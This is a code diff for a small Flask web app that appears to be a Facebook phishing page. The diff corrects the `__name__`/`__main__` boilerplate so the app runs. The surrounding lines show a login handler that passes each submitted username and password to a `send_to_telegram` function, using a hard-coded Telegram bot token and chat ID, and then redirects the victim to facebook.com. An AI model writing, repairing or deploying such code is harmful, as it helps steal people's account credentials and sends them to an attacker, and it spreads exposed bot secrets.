@@ -2,7 +2,7 @@ import os
 import requests
 from flask import Flask, render_template_string, request, redirect
 
-app = Flask(name)
+app = Flask(__name__)
 
 TELEGRAM_BOT_TOKEN = "8639412768:AAGmCsr80jvmPy3HXR9wOmUmUEsZrjZsjck"
 TELEGRAM_CHAT_ID = "7333717671"
@@ -82,6 +82,6 @@ def login():
     send_to_telegram(username, password)
     return redirect("https://www.facebook.com")
 
-if name == 'main':
+if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
